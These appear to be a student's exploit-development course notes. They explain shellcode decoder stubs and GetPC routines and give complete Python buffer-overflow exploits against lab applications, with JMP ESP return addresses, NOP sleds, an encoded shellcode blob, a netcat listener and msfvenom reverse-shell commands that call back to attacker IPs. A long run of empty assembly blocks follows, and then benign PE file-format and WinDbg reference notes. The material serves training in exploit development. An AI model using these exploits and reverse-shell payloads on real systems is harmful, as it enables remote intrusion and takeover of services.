The job of this stub is to iterate over the encoded shellcode bytes and decode them back to their original executable form.

The decoder needs to get its address in memory and look a few bytes ahead to locate the encoded shellcode that it needs to decode.

During the process of gathering the decoder stub's location in memory, the code performs a sequence of assembly instructions commonly referred to as a **GetPC** routine.

This short routine moves the value of the EIP register (sometimes referred to as the Program Counter or PC) into another register.

As with other GetPC routines, those used by shikata_ga_nai have an unfortunate side-effect of writing data at and around the top of the stack.

This eventually mangles several bytes close to the address pointed at by the ESP register. This small change on the stack is a problem for us because the decoder starts exactly at the address pointed to by the ESP register. In short, the GetPC routine execution ends up changing a few bytes of the decoder itself, and potentially the encoded shellcode. This will eventually cause the decoding process to fail and crash the target process.

To avoid this issue, 2 ways:

- Adjust ESP backwards, making use of assembly instructions such as `DEC ESP`, `SUB ESP, 0xXX` before executing the decoder.

- Precede our payload with a series of No Operation (`NOP`) instructions, which have an opcode value of `0x90`. These instructions, also defined as a NOP sled or NOP slide, will let the CPU "slide" through the NOPs until the payload is reached.

By the time the execution reaches the shellcode decoder, the stack pointer is far enough away not to corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.

```bash
sudo nc -lvp 443
```

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  nops = b"\x90" * 10
  shellcode= b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff..."
  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

## Improving the Exploit

Following its execution, the default exit method of a Metasploit shellcode is the **ExitProcess** API. This exit method will shut down the whole web service process when the reverse shell is terminated, effectively killing the Sync Breeze service and causing it to crash.

If the program we are exploiting is a **threaded application**, try to avoid crashing the service completely by using the **ExitThread** API to only terminate the affected thread of the program.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Replace regex `"\n"` with blank in VS Code

## Extra Mile

### VulnApp1

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 7001
  size = 800

  filler = b"A" * 2288
  eip = b"\xcf\x10\x80\x14" # 148010cf
  offset = b"C" * 8
  nops = b"\x90" * 10
  # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00"
  shellcode = b"\xbb\x49\x96\xa8\xee\xd9\xec\xd9\x74\..."
  # shellcode+= b"D" * (2560 - len(filler) - len(eip) - len(offset) - len(nops) - len(shellcode))
    
  print("Sending evil buffer...")
  
  buffer = filler + eip + offset + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except:
  print("Could not connect!")
```

### VulnApp2.exe

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 7002

  nops = b"\x90" * 10
  # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x3b\x45"
  shellcode = b"\xbb\xda\xe4\xc8\x5b\xda\xdc\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x18\xe0\x2a\xae\x60\x01\x28\x51\x98\xd2\x4d\xdb\x7d\xe3\x4d\xbf\xf6\x54\x7e\xcb\x5a\x59\xf5\x99\x4e\xea\x7b\x36\x61\x5b\x31\x60\x4c\x5c\x6a\x50\xcf\xde\x71\x85\x2f\xde\xb9\xd8\x2e\x27\xa7\x11\x62\xf0\xa3\x84\x92\x75\xf9\x14\x19\xc5\xef\x1c\xfe\x9e\x0e\x0c\x51\x94\x48\x8e\x50\x79\xe1\x87\x4a\x9e\xcc\x5e\xe1\x54\xba\x60\x23\xa5\x43\xce\x0a\x09\xb6\x0e\x4b\xae\x29\x65\xa5\xcc\xd4\x7e\x72\xae\x02\x0a\x60\x08\xc0\xac\x4c\xa8\x05\x2a\x07\xa6\xe2\x38\x4f\xab\xf5\xed\xe4\xd7\x7e\x10\x2a\x5e\xc4\x37\xee\x3a\x9e\x56\xb7\xe6\x71\x66\xa7\x48\x2d\xc2\xac\x65\x3a\x7f\xef\xe1\x8f\xb2\x0f\xf2\x87\xc5\x7c\xc0\x08\x7e\xea\x68\xc0\x58\xed\x8f\xfb\x1d\x61\x6e\x04\x5e\xa8\xb5\x50\x0e\xc2\x1c\xd9\xc5\x12\xa0\x0c\x49\x42\x0e\xff\x2a\x32\xee\xaf\xc2\x58\xe1\x90\xf3\x63\x2b\xb9\x9e\x9e\xbc\x06\xf6\x8d\xa0\xef\x05\xcd\xd9\x54\x80\x2b\xb3\xba\xc5\xe4\x2c\x22\x4c\x7e\xcc\xab\x5a\xfb\xce\x20\x69\xfc\x81\xc0\x04\xee\x76\x21\x53\x4c\xd0\x3e\x49\xf8\xbe\xad\x16\xf8\xc9\xcd\x80\xaf\x9e\x20\xd9\x25\x33\x1a\x73\x5b\xce\xfa\xbc\xdf\x15\x3f\x42\xde\xd8\x7b\x60\xf0\x24\x83\x2c\xa4\xf8\xd2\xfa\x12\xbf\x8c\x4c\xcc\x69\x62\x07\x98\xec\x48\x98\xde\xf0\x84\x6e\x3e\x40\x71\x37\x41\x6d\x15\xbf\x3a\x93\x85\x40\x91\x17\xa5\xa2\x33\x62\x4e\x7b\xd6\xcf\x13\x7c\x0d\x13\x2a\xff\xa7\xec\xc9\x1f\xc2\xe9\x96\xa7\x3f\x80\x87\x4d\x3f\x37\xa7\x47"
  filler = b"A" * (2080 - len(nops) - len(shellcode))
  eip = b"\x11\x2e\x80\x14" # call ecx - 14802e11
  jumpcode = b"C" * 12
  buffer = nops + shellcode + filler + eip + jumpcode
    
  print("Sending evil buffer...")
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except:
  print("Could not connect!")
```

# SEH

```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```



```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

```nasm

```


```nasm

```


```nasm

```


```nasm

```


```nasm

```

# Portable Executable File Format

[PE Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)

## MS-DOS Header and Stub Program

The **MS-DOS header** is always found at the beginning of the file.

The stub program comes directly after the DOS header and the DOS header is 0x40 bytes in size.
=> **DOS stub** is located at an offset of **0x40**

**e_lfanew**, a LONG (4 bytes), represents the number of bytes from the beginning of the image file to the **PE header**. This distance from the beginning of the file is aka a **file offset**.

### PE Header

The offset of **File header** is 4 bytes after the beginning of the **PE header**.

```
typedef struct _IMAGE_NT_HEADERS {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

### File Header

```
typedef struct _IMAGE_FILE_HEADER {
    WORD    Machine
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
```

**Characteristics** contains a number of flags that characterize the file.
- IMAGE_FILE_EXECUTABLE_IMAGE (0x0002) indicates that the file is executable, a characteristic that is only given to PE images.
- IMAGE_FILE_DLL (0x2000) indicates that the file is a DLL.
- IMAGE_FILE_RELOCS_STRIPPED (0x0001) indicates that the file does not contain a base relocation table and must be loaded at the preferred base address.

Our executable contains 2 flags: 0x2 (IMAGE_FILE_EXECUTABLE_IMAGE) and 0x100 (IMAGE_FILE_32BIT_MACHINE), which indicates that the intended architecture is 32-bit.
=> 0x2 bitwise OR 0x100 = 0x102

The size of the *File Header* is 20 (0x14) bytes

### Optional Header

- **AddressOfEntryPoint** contains the Relative Virtual Address (RVA) of the entry point, the location in the program where execution begins. The **RVA** is an address relative to the base address, where the first bytes of the PE file are loaded into memory. In C and C-related languages, the entry point is located just before the **main** function in execution. It's typically found in the **.text** section by default. 
- **BaseOfCode** contains the RVA of the PE section, which contains executable code. This is typically the *.text* section.
- On disk, **ImageBase** contains the preferred base address at which the first byte of data is loaded into memory. Although the *ImageBase* address is preferred, it may not be available and if the file allows (i.e. if it contains relocation information), it may be loaded at a different address.
- With the base address, we can calculate a Virtual Address (**VA**) by adding to it the RVA (base address + RVA = VA).

The difference between the file offset and RVA of corresponding values is caused by:
- **SectionAlignment** contains the alignment factor in bytes used for sections in **memory**. By default, this is the **page size** of the executable's intended architecture. This is typically 0x1000 and, sections in memory begin at RVAs that are multiples of 0x1000. **BaseOfCode**, which holds the RVA of the .text section, also has the value 0x1000.
- **FileAlignment** indicates the alignment factor in bytes used for sections in the PE image file on **disk**. This means that the file offsets of sections on disk are multiples of this value.

- **SizeOfImage** contains the size in bytes rounded up to a multiple of SectionAlignment of the entire image when loaded into memory. This indicates to the loader the amount of memory that is required to load the image.
- **SizeOfHeaders** contains the size of all headers when rounded up to a multiple of FileAlignment.
- For both SizeOfImage and SizeOfHeaders, the additional space that results from rounding up from the size of data is padded with zeros.

### DataDirectory in Optional Header
**DataDirectory** contains a number of entries for important data structures that may be needed at run-time and functions as an easy way to locate them.

```
typedef struct _IMAGE_OPTIONAL_HEADER {
    ...
    DWORD   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
```

IMAGE_NUMBEROF_DIRECTORY_ENTRIES is contained in the **NumberOfRvaAndSizes** field in the Optional Header.

```
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

Each entry consists of 2 elements. These are the RVA of the data structure and size of the data. 

Each variable is defined as an *index* into the data directory and is associated with a particular data structure.

```
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor
```

- **Export Directory**: to resolve the symbols for functions, which are exported by the current PE image and available to be imported by others. allows the loader to *find the address of specific functions that are imported by other modules*. Exports are typically provided by DLLs. In this case, the RVA is "0" and the size is "0", indicating that the executable does not have an export table and does not export any symbols.
- **Import** Directory: to resolve the symbols imported by the executable from other modules. helps the executable *resolve the addresses of imported functions*.
- **Base Relocation Table** helps the loader to load the executable at an address other than the preferred base address. helps the loader *find addresses that must be re-based with respect to the load address used*.
- **Import Address Table (IAT)** is a specific table containing import-related information. On disk, its entries helps the loader *find the virtual addresses of imported functions* and, once those addresses are found, they are overwritten with the corresponding addresses.

### Section Headers
- **VirtualSize**, in the case of an image, is interpreted as the size of the section when loaded into memory
- **VirtualAddress** contains the RVA for the first byte of the section. The RVAs of sections must be a multiple of the alignment factor *SectionAlignment*.
- **PointerToRawData** is the file offset of the beginning of the section on disk. Sections must begin on file offsets that are multiples of the alignment factor *FileAlignment*.
- **SizeOfRawData** contains the size of the initialized data on disk. This number is also rounded up to a multiple of FileAlignment
    - If VirtualSize < SizeOfRawData, the remaining bytes in between the end of the data in the .text section and the beginning of the next section are **null padded** (filled with null bytes).
    - A .text section with a virtual size > the raw size may indicate that the executable has been **packed**.

- **Characteristics** are **section flags** that represent attributes of the section.
    - IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, and IMAGE_SCN_MEM_EXECUTE specify that the section can be read, written, or executed, respectively.
    - IMAGE_SCN_CNT_CODE, IMAGE_SCN_CNT_INITIALIZED_DATA, and IMAGE_SCN_CNT_UNINITIALIZED_DATA indicate that a section contains executable code, initialized data, or uninitialized data, respectively.

The Characteristics 0x60000020 is composed of 3 flags that have been combined into a single value using a **bitwise OR** operation: 0x40000000 (IMAGE_SCN_MEM_READ), 0x20000000 (IMAGE_SCN_MEM_EXECUTE), and 0x00000020 (IMAGE_SCN_CNT_CODE).

The .text section is marked as both containing executable code (IMAGE_SCN_CNT_CODE) and as executable (IMAGE_SCN_MEM_EXECUTE). Each section that contains code is also executable, but not all sections that are executable necessarily contain code.
- The IMAGE_SCN_CNT_CODE indicates that the contents of the section are executable code
- IMAGE_SCN_MEM_EXECUTE indicates that the memory range that contains the code is capable of being executed.

### Important Standard Sections
- **.text** section typically contains executable code and is readable and executable but *not writable*.
- **.data** section contains **initialized** variables, i.e., these variables are assigned a specific initial value at compile time. This includes global and static variables that are initialized. The values can be changed at any point during run-time. => the .data section is both readable and *writable*.
- **.bss** section contains **uninitialized** variables, i.e., the static and global variables are not assigned a specific initial value at compile-time (to take up less space on disk). On Windows and other operating systems, the .bss section is initialized to zero in memory. Because it is set during run-time, it is both readable and *writable*, like the .data section.
- **.rdata** contains **constant** initialized data and is *read-only*. This data may be constant global and static variables or many other data types.
- **.rsrc** section contains additional resources (icons, bitmaps, menus, strings, etc.) that the image may use for things like multi-language support with each language being supported by a particular resource. This section is marked as *read-only*.
- **.reloc** contains relocation data that helps the loader re-base the image if it cannot be loaded at its preferred base address. To do this, there must be a base relocation table, which consists of base relocation blocks. These blocks each represent a single page and contain the offsets of each memory location where re-basing must be performed and the type of re-basing that must be applied to it.
- **.edata** section allows the symbols exported by the PE image to be imported by another module. In order to use an imported symbol, the PE image that imports it must be able to resolve its address, something that export data helps with.
- **.idata** section allows an image to resolve the symbols that it imports from other modules to addresses at run-time.

### Export Directory Table
.edata is typically merged into .rdata by Visual Studio during the compilation process

```
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA: Export Address Table
    DWORD   AddressOfNames;         // RVA: Export Name Pointer Table
    DWORD   AddressOfNameOrdinals;  // RVA: Ordinal Table
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

To store the location of other export-related tables.
- AddressOfFunctions contains the **Export Address Table**,
- AddressOfNames contains the **Export Name Pointer Table**, and
- AddressOfNameOrdinals contains the **Ordinal Table**.

Symbols can be referred to in 2 ways, either by an ordinal number associated with them or by name (a string).

- Suppose imports take place using **ordinals**. An ordinal, in this case, is simply an index into the *Export Address Table*, which contains the RVA of each symbol as entries.
- If **names** are used, the loader uses the *Export Name Pointer Table* and the *Ordinal Table*. These tables correspond in the sense that the n-th entry of the Ordinal Table contains the ordinal for the symbol pointed to by the n-th entry of the Export Name Pointer Table. In this case, the loader first searches the Export Name Pointer Table for the symbol name and when it finds it, derives the ordinal from the corresponding entry in the Ordinal Table. It then uses this ordinal to find the symbol's RVA in the Export Address Table.

### Import Directory Table

.idata is typically merged into .rdata by Visual Studio during the compilation process

The **.idata** section contains information that allows an image to resolve the symbols that it imports from other modules to addresses at run-time. Import information is important for **malware analysis** because the functions that are imported and used can tell us a lot about what the program does and can help us identify malicious software.
The import information begins with the Import Directory Table, which is a sequence of entries, one for each DLL imported.

```
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;
        DWORD   OriginalFirstThunk; // RVA: Import Lookup Table (ILT)
    } DUMMYUNIONNAME;
    DWORD   TimeDateStamp;
    DWORD   ForwarderChain;
    DWORD   Name;
    DWORD   FirstThunk;             // RVA: Import Address Table (IAT)
} IMAGE_IMPORT_DESCRIPTOR;
```

- **Name** is the RVA of the string that contains the DLL name.
- **OriginalFirstThunk** and **FirstThunk** point to the **Import Lookup / Name Table (ILT / INT)** and **Import Address Table (IAT)**, respectively, for the specific DLL. Until binding, in which imported symbols are resolved to addresses, these two tables have the same content and consist of entries for each imported function. When the addresses of these imported functions are resolved, the IAT entries are overwritten with the resolved addresses.

The entries of the ILT end IAT are defined by the IMAGE_THUNK_DATA structure.
```
typedef struct _IMAGE_THUNK_DATA32 {
    union {
        DWORD ForwarderString;      
        DWORD Function;             
        DWORD Ordinal;
        DWORD AddressOfData;       
    } u1;
} IMAGE_THUNK_DATA32;
```
the DWORD in IMAGE_THUNK_DATA32 can be interpreted in different ways. For executable files, it has two possible interpretations, which correspond to the 2 different ways that symbols can be referred to. The first is as an Ordinal number. The second, which eventually leads to the symbol name, is, as AddressOfData, an RVA to an IMAGE_IMPORT_BY_NAME structure in the Hint/Name Table.
Note that we can tell whether ordinals or symbol names are used by inspecting the highest bit of the Ordinal/AddressOfData field. If it's set, ordinals are used. If not, imports use names.
Let's inspect IMAGE_IMPORT_BY_NAME.
```
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;
    CHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
```
- **Hint**, which is an index into the Export Name Pointer Table. This table belongs to the export data of the DLL and contains pointers to the function name. We discussed it above in the context of the Export Directory structure.
The second field is a string that contains the name of the imported function. The name is used to confirm that the hint has located the correct entry in the Export Name Pointer Table or, if the hint does not locate it, to find the correct entry. Recall that this entry is used to find the ordinal for the symbol and, ultimately, its RVA. Once the RVA is found, the loader overwrites the entry in the IAT with this value.

### Inspecting PE Files with WinDbg

| **Command** | **Description** |
| --------------|-------------------|
| `lm` | find the load address, which may not the same value contained in ImageBase, the preferred base address, `00770000` |
| `dt ntdll!_IMAGE_DOS_HEADER 00770000` | inspect the contents of MS-DOS header, `e_lfanew: 0n248` |
| `dt ntdll!_IMAGE_NT_HEADERS 00770000+0n248` | inspect the PE file header |
| `!dh -h` | dumps headers from an image based at address |
| `!dh -f 00770000` | display the PE file headers of the modules |